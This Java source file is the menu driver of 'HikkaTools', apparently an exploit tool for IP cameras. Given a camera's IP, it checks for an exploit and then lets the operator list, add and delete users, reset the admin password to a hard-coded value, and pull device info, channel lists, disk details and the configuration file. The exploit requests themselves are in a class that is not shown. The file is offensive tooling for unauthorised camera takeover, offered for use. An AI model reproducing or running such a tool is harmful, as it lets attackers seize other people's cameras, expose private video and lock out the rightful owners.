import java.util.Scanner;

public class Main {

    public static void print(Object x) {
        System.out.println(x);
    }

    public static void main(String[] args) throws Exception {

        try {


            SystemOut.print("#######################################");
            SystemOut.print("##       Welcome to HikkaTools       ##");
            SystemOut.print("## usage java -jar jikka.jar IPCAM   ##");
            SystemOut.print("## github.com/taclomoto/HikkaTools   ##");
            SystemOut.print("##           ~Ver 0.1~               ##");
            SystemOut.print("#######################################");


            if (args.length != 1) {
              System.exit(0);
            }

            String ip = args[0];



            Hik a = new Hik(ip);

            if (a.test4expl() == false) {
                SystemOut.print("oops, wtf?");
                SystemOut.print("usage java -jar jikka.jar IPCAM  ");
                SystemOut.print("Exploit not found");
            }


            SystemOut.print("Camera Status");
            SystemOut.print("___________________________________");
            SystemOut.print("IP: " + ip);
            SystemOut.print(Parser.device(a.devInfo()));
            SystemOut.print("___________________________________");
            SystemOut.print("USERS");
            SystemOut.print(Parser.users(a.getusers()));
            SystemOut.print("___________________________________");
            SystemOut.print("Channels");
            SystemOut.print(Parser.getChannels(a.getChanels()));
            SystemOut.print("___________________________________");

            SystemOut.print(Parser.HDD(a.getHDD()));

            Scanner in = new Scanner(System.in);
            while (true) {
                SystemOut.print("");
                SystemOut.print("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
                SystemOut.print("");
                SystemOut.print("Menu:");
                SystemOut.print("1 - View Users");
                SystemOut.print("2 - Add User");
                SystemOut.print("3 - Delete User");
                SystemOut.print("4 - Reset Admin");
                SystemOut.print("5 - Raw data submenu");
                SystemOut.print("6 - about cam");
                SystemOut.print("7 - Download ConfFile");
                SystemOut.print("0 - Exit");

                switch (in.nextLine()) {


                    case "1":


                        SystemOut.print(Parser.users(a.getusers()));

                        break;
                    case "2":
                        SystemOut.print("Username");
                        String name = in.nextLine();
                        SystemOut.print("id");
                        if (a.addUser(name, in.nextLine()))
                            SystemOut.print("Success - " + name + " password is set to navalny2018");
                        else
                            SystemOut.print("oops, wtf?");
                        break;


                    case "3":
                        SystemOut.print("id");
                        if (a.deleteUser(in.nextLine()))
                            SystemOut.print("Success");
                        else
                            SystemOut.print("oops, wtf?");
                        break;

                    case "4":
                        SystemOut.print("New password will be: navalny2018 ");
                        if (a.resetadmin())
                            SystemOut.print("Success");
                        else
                            SystemOut.print("oops, wtf?");
                        break;


                    case "5":

                        boolean t = true;
                        SystemOut.clear();

                        while (t) {
                            SystemOut.print("Verbose lvl = 3");
                            SystemOut.print("1 - Device info");
                            SystemOut.print("2 - View users");
                            SystemOut.print("3 - Reset admin");
                            SystemOut.print("4 - View Channels");
                            SystemOut.print("5 - View Hdd");
                            SystemOut.print("0 - Back");
                            a.setVerbLevel(4);

                            switch (in.nextLine()) {

                                case "1":
                                    a.devInfo();
                                    break;

                                case "2":

                                    a.getusers();
                                    break;

                                case "3":

                                    a.resetadmin();
                                    break;

                                case "4":

                                    a.getChanels();
                                    break;

                                case "5":
                                    a.getHDD();
                                            break;

                                case "0":
                                    t = false;
                                    break;
                            }
                        }

                        a.setVerbLevel(0);


                        break;


                    case "6":

                        SystemOut.print("Camera Status");
                        SystemOut.print("___________________________________");
                        SystemOut.print("IP: " + ip);
                        SystemOut.print(Parser.device(a.devInfo()));
                        SystemOut.print("___________________________________");
                        SystemOut.print("USERS");
                        SystemOut.print(Parser.users(a.getusers()));
                        SystemOut.print("___________________________________");
                        SystemOut.print("Channels");
                        SystemOut.print(Parser.getChannels(a.getChanels()));

                        break;

                    case "7":

                        if (a.downloadConfig()) {
                            SystemOut.print("Downloaded");
                        } else
                            SystemOut.print("oops, wtf?");
                        break;

                    case "0":
                        System.exit(0);
                }


            }


        } catch (Exception e) {
            SystemOut.print("@@@@@@@@\n" + e);
        }
    }
}
